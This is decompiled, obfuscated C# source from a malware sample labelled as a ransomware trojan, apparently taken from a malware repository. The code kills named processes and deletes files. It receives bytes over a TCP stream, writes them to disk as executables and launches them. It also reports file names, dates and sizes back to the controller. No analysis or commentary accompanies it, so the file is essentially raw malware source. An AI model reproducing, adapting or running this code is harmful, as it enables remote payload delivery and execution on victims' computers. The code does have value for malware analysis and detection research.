// Decompiled with JetBrains decompiler
// Type:  
// Assembly: RingBell, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 126B6CA2-9E8E-4E8F-B66A-E8ED3E4C478A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public sealed class \u0005\u2000
{
  public \u0008\u2000 \u0002;
  public DateTime \u0003;

  public \u0005\u2000(\u0008\u2000 _param1) => this.\u0002 = _param1;

  public void \u0002(int _param1)
  {
    try
    {
      Process.GetProcessById(_param1).Kill();
      Thread.Sleep(10);
    }
    catch
    {
    }
  }

  public void \u0002()
  {
    DateTime now = DateTime.Now;
    try
    {
      if (Math.Abs(this.\u0003.Subtract(now).Minutes) <= 6)
        return;
      this.\u0002.\u000E\u2001.Close();
      this.\u0002.\u0003\u2002 = false;
    }
    catch
    {
    }
  }

  public void \u0003()
  {
    try
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005\u2001.\u0002\u2000);
      if (processesByName.Length == 1)
        this.\u0002(processesByName[0].Id);
      Thread.Sleep(50);
      if (!File.Exists(\u0005\u2001.\u0005() + \u0005\u2001.\u0002\u2000))
        return;
      File.Delete(\u0005\u2001.\u0005() + \u0005\u2001.\u0002\u2000);
      string str1 = \u0005\u2001.\u0005();
      string str2 = \u0005\u2001.\u0002\u2000;
      char[] chArray1 = new char[1]{ '|' };
      if (File.Exists(str1 + str2 + \u0008\u2001.\u0002(-2094343270).Split(chArray1)[0]))
      {
        string str3 = \u0005\u2001.\u0005();
        string str4 = \u0005\u2001.\u0002\u2000;
        char[] chArray2 = new char[1]{ '|' };
        File.Delete(str3 + str4 + \u0008\u2001.\u0002(-2094343270).Split(chArray2)[0]);
      }
      Thread.Sleep(150);
      this.\u0008();
    }
    catch
    {
    }
  }

  public void \u0002(string _param1)
  {
    try
    {
      Process.Start(_param1);
    }
    catch
    {
    }
  }

  public void \u0002(string _param1, string _param2, \u0003\u2000 _param3)
  {
    try
    {
      byte[] bytes = this.\u0002.\u0002();
      string str1 = _param1;
      if (str1 == null)
        return;
      if (str1 == \u0008\u2001.\u0002(-2094343253))
      {
        if (bytes == null)
          return;
        File.WriteAllBytes(\u0005\u2001.\u0002() + \u0005\u2001.\u000F, bytes);
      }
      else if (str1 == \u0008\u2001.\u0002(-2094343236))
      {
        if (bytes == null)
          return;
        if (!Directory.Exists(\u0005\u2001.\u0005()))
          Directory.CreateDirectory(\u0005\u2001.\u0005());
        Process[] processesByName = Process.GetProcessesByName(\u0005\u2001.\u0002\u2000);
        if (processesByName.Length == 1)
          this.\u0002(processesByName[0].Id);
        File.WriteAllBytes(\u0005\u2001.\u0005() + \u0005\u2001.\u0002\u2000 + \u0008\u2001.\u0002(-2094343231), bytes);
      }
      else if (str1 == \u0008\u2001.\u0002(-2094343204) || str1 == \u0008\u2001.\u0002(-2094343194))
      {
        if (!Directory.Exists(\u0005\u2001.\u0006()))
          Directory.CreateDirectory(\u0005\u2001.\u0006());
        if (bytes == null)
          return;
        Process[] processesByName = Process.GetProcessesByName(\u0005\u2001.\u0002\u2002);
        if (processesByName.Length == 1)
          this.\u0002(processesByName[0].Id);
        string str2 = \u0005\u2001.\u0006();
        string str3 = \u0005\u2001.\u0002\u2002;
        char[] chArray = new char[1]{ '!' };
        File.WriteAllBytes(str2 + str3 + \u0008\u2001.\u0002(-2094343416).Split(chArray)[0], bytes);
      }
      else
      {
        if (!(str1 == \u0008\u2001.\u0002(-2094343396)) || bytes == null)
          return;
        if (!Directory.Exists(\u0005\u2001.\u0003()))
          Directory.CreateDirectory(\u0005\u2001.\u0003());
        string str4 = \u0005\u2001.\u0003();
        string str5 = \u0005\u2001.\u000E;
        char[] chArray = new char[1]{ '!' };
        File.WriteAllBytes(str4 + str5 + \u0008\u2001.\u0002(-2094343416).Split(chArray)[0], bytes);
      }
    }
    catch
    {
    }
  }

  public string \u0002(string _param1, bool _param2)
  {
    string str1;
    try
    {
      FileInfo fileInfo = new FileInfo(_param1);
      string name = fileInfo.Name;
      string str2;
      if (!_param2)
      {
        char[] chArray = new char[1]{ '|' };
        str2 = \u0008\u2001.\u0002(-2094343391).Split(chArray)[0];
      }
      else
      {
        char[] chArray = new char[1]{ '|' };
        str2 = \u0008\u2001.\u0002(-2094343370).Split(chArray)[0];
      }
      string str3 = name + str2;
      string str4 = fileInfo.CreationTimeUtc.ToString();
      string str5;
      if (!_param2)
      {
        char[] chArray = new char[1]{ '|' };
        str5 = \u0008\u2001.\u0002(-2094343391).Split(chArray)[0];
      }
      else
      {
        char[] chArray = new char[1]{ '|' };
        str5 = \u0008\u2001.\u0002(-2094343370).Split(chArray)[0];
      }
      string str6 = str3 + str4 + str5;
      string str7 = this.\u0002(fileInfo.Length);
      string str8;
      if (!_param2)
      {
        char[] chArray = new char[1]{ '|' };
        str8 = \u0008\u2001.\u0002(-2094343391).Split(chArray)[0];
      }
      else
      {
        char[] chArray = new char[1]{ '|' };
        str8 = \u0008\u2001.\u0002(-2094343370).Split(chArray)[0];
      }
      string str9 = str6 + str7 + str8;
      if (!_param2)
      {
        \u0008\u2000 obj = this.\u0002;
        char[] chArray = new char[1]{ '|' };
        obj.\u0002((byte[]) null, \u0008\u2001.\u0002(-2094343353).Split(chArray)[0] + str9, false);
      }
      str1 = str9;
    }
    catch
    {
      str1 = string.Empty;
    }
    return str1;
  }

  public string \u0002(long _param1)
  {
    string str;
    try
    {
      string[] strArray1 = new string[7];
      char[] chArray1 = new char[1]{ '!' };
      strArray1[0] = \u0008\u2001.\u0002(-2094343321).Split(chArray1)[0];
      char[] chArray2 = new char[1]{ '!' };
      strArray1[1] = \u0008\u2001.\u0002(-2094343308).Split(chArray2)[0];
      char[] chArray3 = new char[1]{ '!' };
      strArray1[2] = \u0008\u2001.\u0002(-2094343526).Split(chArray3)[0];
      strArray1[3] = \u0008\u2001.\u0002(-2094343512);
      strArray1[4] = \u0008\u2001.\u0002(-2094343519);
      strArray1[5] = \u0008\u2001.\u0002(-2094343490);
      char[] chArray4 = new char[1]{ '!' };
      strArray1[6] = \u0008\u2001.\u0002(-2094343497).Split(chArray4)[0];
      string[] strArray2 = strArray1;
      if (_param1 != 0L)
      {
        long a = Math.Abs(_param1);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        str = ((double) Math.Sign(_param1) * num).ToString() + strArray2[int32];
      }
      else
        str = \u0008\u2001.\u0002(-2094343483) + strArray2[0];
    }
    catch
    {
      str = string.Empty;
    }
    return str;
  }

  public NetworkStream \u0002(TcpClient _param1) => _param1.GetStream();

  public void \u0005()
  {
    try
    {
      byte[] bytes = this.\u0002.\u0002();
      if (bytes == null)
        return;
      string str1 = \u0005\u2001.\u0002();
      string str2 = \u0005\u2001.\u000E\u2001;
      char[] chArray1 = new char[1]{ '!' };
      if (File.Exists(str1 + str2 + \u0008\u2001.\u0002(-2094343416).Split(chArray1)[0]))
        return;
      string str3 = \u0005\u2001.\u0002();
      string str4 = \u0005\u2001.\u000E\u2001;
      char[] chArray2 = new char[1]{ '!' };
      File.WriteAllBytes(str3 + str4 + \u0008\u2001.\u0002(-2094343416).Split(chArray2)[0], bytes);
      this.\u0002(\u0005\u2001.\u0002() + \u0005\u2001.\u000E\u2001 + \u0008\u2001.\u0002(-2094343231).ToString());
    }
    catch
    {
    }
  }

  public void \u0008()
  {
    try
    {
      if (Process.GetProcessesByName(\u0005\u2001.\u0002\u2000).Length != 0)
        return;
      string empty = string.Empty;
      string str1 = \u0005\u2001.\u0005();
      string str2 = \u0005\u2001.\u0002\u2000;
      char[] chArray1 = new char[1]{ '!' };
      if (!File.Exists((str1 + str2 + \u0008\u2001.\u0002(-2094343416)).Split(chArray1)[0]))
        return;
      string str3 = \u0005\u2001.\u0005();
      string str4 = \u0005\u2001.\u0002\u2000;
      char[] chArray2 = new char[1]{ '!' };
      this.\u0002(str3 + str4 + \u0008\u2001.\u0002(-2094343416).Split(chArray2)[0].ToString());
    }
    catch
    {
    }
  }

  public void \u0006()
  {
    try
    {
      if (Process.GetProcessesByName(\u0005\u2001.\u0002\u2002).Length != 0)
        return;
      string str1 = \u0005\u2001.\u0006();
      string str2 = \u0005\u2001.\u0002\u2002;
      char[] chArray1 = new char[1]{ '!' };
      if (!File.Exists(str1 + str2 + \u0008\u2001.\u0002(-2094343416).Split(chArray1)[0]))
        return;
      string str3 = \u0005\u2001.\u0006();
      string str4 = \u0005\u2001.\u0002\u2002;
      char[] chArray2 = new char[1]{ '!' };
      this.\u0002(str3 + str4 + \u0008\u2001.\u0002(-2094343416).Split(chArray2)[0]);
    }
    catch
    {
    }
  }

  public void \u000E()
  {
    try
    {
      if (Process.GetProcessesByName(\u0005\u2001.\u0002\u2002).Length != 0)
        return;
      string str1 = \u0005\u2001.\u0006();
      string str2 = \u0005\u2001.\u0002\u2002;
      char[] chArray1 = new char[1]{ '!' };
      if (!File.Exists(str1 + str2 + \u0008\u2001.\u0002(-2094343416).Split(chArray1)[0]))
        return;
      string str3 = \u0005\u2001.\u0006();
      string str4 = \u0005\u2001.\u0002\u2002;
      char[] chArray2 = new char[1]{ '!' };
      this.\u0002(str3 + str4 + \u0008\u2001.\u0002(-2094343416).Split(chArray2)[0].ToString());
    }
    catch
    {
    }
  }

  public string[] \u0002() => Encoding.UTF8.GetString(\u0005\u2001.\u0008\u2000, 0, \u0005\u2001.\u0008\u2000.Length).Split('?');
}
